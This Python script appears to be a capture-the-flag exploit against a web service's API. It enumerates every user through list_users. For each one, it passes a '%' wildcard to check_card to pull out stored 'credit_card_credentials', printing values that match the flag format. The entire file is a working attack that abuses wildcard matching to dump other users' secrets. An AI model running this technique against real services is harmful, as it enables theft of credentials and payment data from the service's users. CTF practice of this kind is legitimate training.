import sys

from api import Api


def list_users(api):
    res = api.list_users()
    if res is None: return []
    if 'addition' not in res or 'users' not in res['addition']: return []
    return res['addition']['users']

def check_card(api, login):
    res = api.check_card(login, '%')
    if 'addition' in res and 'credit_card_credentials' in res['addition']:
        return res['addition']['credit_card_credentials']


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Need host")
        exit()
    api = Api(sys.argv[1])

    for login in list_users(api):
        flag = check_card(api, login)
        if flag.endswith('='):
            print(flag)